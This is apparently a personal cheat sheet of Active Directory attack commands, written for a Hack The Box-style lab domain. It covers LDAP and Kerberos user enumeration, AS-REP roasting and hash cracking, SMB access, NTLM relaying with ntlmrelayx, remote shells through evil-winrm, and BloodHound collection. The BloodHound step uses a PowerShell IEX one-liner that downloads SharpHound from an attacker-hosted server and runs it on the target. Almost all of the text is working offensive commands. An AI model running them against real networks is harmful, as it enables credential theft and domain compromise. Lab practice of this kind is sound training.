# Commands-Importants

- LDAP with nmap:
```bash
nmap --script ldap-search -p389 <target> -oN ldapScan
```
- Kerberos with nmap:
```bash
nmap -script krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=/opt/Seclists/Usernames/Names/names.txt -p88 <target>
```
- Enumerate with `rpcclient`
```bash
rpcclient -U "" <target> -N -c 'enumdomusers' 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > users
```
- AS-REP Roasting attack -> I get a hash/ticket  of a user
```bash
GetNPUsers htb.local/ -no-pass -usersfile users
```
- KERBEROS -> I need credentials -> `GetUserSPNs`

- Crack the hash/ticket with `john`

- Enumerate with smbclient and the credentials
```bash
smbclient -L <target> -U "htb.local\<username>" 
>>>> password -> I put the password
```
- Enumerate the all AD with ldap -> outils `ntlmrelayx`
```bash
cd /var/www/html
ntlmrelayx -t <target> ldap://<target> 
> go to web : `http://localhost` and put the credential
> user:password     
-> I will some file created (stop now ntlmrelayx) and start apache
service apache2 start
```
- Connect via `evil-winrm`
```bash
evil-winrm -i <target> -u 'username' -p 'password'
```
- Use of `bloodhound` -> target with powershell
```bash
> target
cd C:\Windows\Temp
mkdir privesc
cd privesc
```
```bash
> my shell
apt install bloodhound neo4j
neo4j console

> web
localhost:7474

> my shell
cd /usr/share/neo4j
bloodhound &> /dev/null &
disown
--> panel of auth appears | connecto bloodhound's credential
```
```bash
> web ---> download the raw of Sharphound.ps1 github
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1

> my shell to share a server via python
python3 -m http.server 80

> target shell powershell -> 'privesc'
IEX(New-Object Net.WebClient).downloadString('http://<my IP>/SharpHound.ps1')

> my shell 
grep "Invoke-" SharHound.ps1

> target shell powershell | this will create a file zip | 'download' is a command of avil-winrm
Invoke-BloodHound -CollectionMethod All
download <file>.BloodHound.zip
```
```bash
> Go to Bloodhound and upload the file zip -> hit "Upload Data"
```




























